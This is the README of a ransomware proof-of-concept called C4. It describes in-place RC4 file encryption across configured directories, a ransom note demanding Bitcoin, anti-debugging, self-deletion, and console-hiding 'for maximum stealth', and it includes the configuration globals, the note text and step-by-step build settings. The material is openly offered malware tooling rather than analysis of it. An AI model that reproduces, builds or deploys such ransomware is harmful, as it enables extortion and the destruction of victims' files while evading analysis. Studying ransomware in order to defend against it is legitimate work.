C4 is a ransomware proof-of-concept that weaponizes the Rivest Cipher 4 (RC4) to encrypt files in place. Compiled without the C runtime (CRT), its binary size stays under 15KB while retaining functionality like multithreading, anti-analysis, and optional self-deletion.

---

### Features


- Uses RC4 encryption in a recursive, multithreaded fashion to rapidly encrypt or decrypt files.  
- Targets files in a configurable list of directories, while skipping those with blacklisted extensions.  
- Drops a ransom note with custom text once encryption completes.  
- Includes anti-debugging logic to terminate execution if a debugger is detected.  
- Self-deletes the executable after finishing.
- Supports a verbose mode to log every encrypted file and report total runtime.

### Usage

```powershell
.\c4.exe
```

No command-line arguments required. C4 will recurse each directory listed in the `g_Directories` global variable, encrypt eligible files, optionally drop a ransom note, then self-delete.

### Configuration

Before building, you can tune C4's behavior by editing the globals at the top of `main.c`. Here's what to look for:

```c
   ///////////////////
  // CONFIGURATION //
 ///////////////////

TEXT_SECTION BOOL g_EncryptMode         =       TRUE;     // TRUE = Encrypt, FALSE = Decrypt
TEXT_SECTION BOOL g_RansomMode          =       TRUE;     // TRUE = Drop a text file (g_Note) with payment instructions to the current directory
TEXT_SECTION BOOL g_AntiDebug           =       TRUE;     // TRUE = Program exits when debugger (such as x64dbg, OllyDbg, WinDbg) is attached 
TEXT_SECTION BOOL g_SelfDelete          =       TRUE;     // TRUE = Binary will self-delete
TEXT_SECTION BOOL g_Verbose             =       TRUE;     // TRUE = Print files, directories, errors, and execution time to the console


LPCWSTR g_Directories[] = { 
    L"C:\\Users\\Public\\TestDirectory", 
    NULL                               
}; 

LPCWSTR g_BlacklistedExtensions[NUM_BLACKLISTED_EXTENSIONS] = {    
    ENCRYPT_EXT_W,
    L".exe", L".dll", L".sys", L".ini", L".conf",
    L".cfg", L".reg", L".dat", L".bat", L".cmd"
};


LPCSTR g_Note = {           
    "YOUR FILES HAVE BEEN ENCRYPTED BY C4.EXE\r\n"
    "This is not a joke. Want your data restored?\r\n"
    "Send 0.5 BTC to the address below:\r\n"
    "1MockBTCAddrxxxxxxxxxxxxxxxxxx\r\n"
    "You have 48 hours.\r\n"
};
```

### Build

**Visual Studio**  
1. Open `C4.sln` in Visual Studio  
2. Set **Configuration** to `Release` and **Platform** to `x64`  
3. Go to **Project â†’ Properties** and configure:  
   - **C/C++ â†’ Code Generation â†’ Runtime Library:** Multi-threaded (/MT)  
   - **C/C++ â†’ Code Generation â†’ Enable C++ Exceptions:** No  
   - **C/C++ â†’ Code Generation â†’ Security Check:** Disable Security Check (/GS-)
   - **C/C++ â†’ Code Generation â†’ Basic Runtime Checks:** Default  
   - **C/C++ â†’ General â†’ SDL checks:** No (/sdl-)  
   - **C/C++ â†’ Optimization â†’ Whole Program Optimization:** No  
   - **Linker â†’ Debugging â†’ Generate Debug Info:** No  
   - **Linker â†’ Manifest File â†’ Generate Manifest:** No  
   - **Linker â†’ Input â†’ Ignore All Default Libraries:** Yes (/NODEFAULTLIB)  
   - **Linker â†’ Advanced â†’ Entry Point:** `main`  
   - **Linker â†’ System â†’ Subsystem:** Windows â€“ hides the console for maximum stealth (switch to Console subsystem when using verbose mode)
4. Build the solution.
